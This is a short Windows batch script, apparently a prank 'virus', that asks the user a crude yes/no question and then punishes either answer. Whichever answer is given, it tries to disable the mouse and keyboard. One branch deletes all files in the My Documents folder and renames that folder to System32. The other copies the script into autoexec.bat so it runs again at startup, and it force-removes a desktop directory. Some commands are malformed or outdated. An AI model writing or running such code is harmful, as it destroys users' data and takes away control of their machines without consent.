@echo off
cls
choice /n /cYN "Do you like shit? [y/n]"
if errorlevel N goto NO
if errorlevel Y goto YES

:NO
cls
echo Learn to respect shit!
c:\windows\rundll32.exe mouse,disable
c:\windows\rundll32.exe keyboard,disable
echo MOUSE AND KEYBOARD DISABLE
pause /ty,2 >nul
if exist C:\MyDo~1 goto MyDo~1
if not exist C:\MyDo~1 goto Eh
:MyDo~1
del c:\MyDo~1\*.doc
del c:\MyDo~1\*.xml
del c:\MyDo~1\*.*
REN C:\MyDo~1 System32
echo Like shit!
start iexplore http://www.ratemypoo.com
exit

:Eh
exit

:YES
cls
echo Nice, you could be my friend
pause > nul
echo BUT IT WONT HELP YOU!
c:\windows\rundll32.exe mouse,disable
c:\windows\rundll32.exe keyboard,disable
echo MOUSE AND KEYBOARD DISABLE
type %0 >> autoexec.bat
RD/s/q c:\windows\deskop
exit

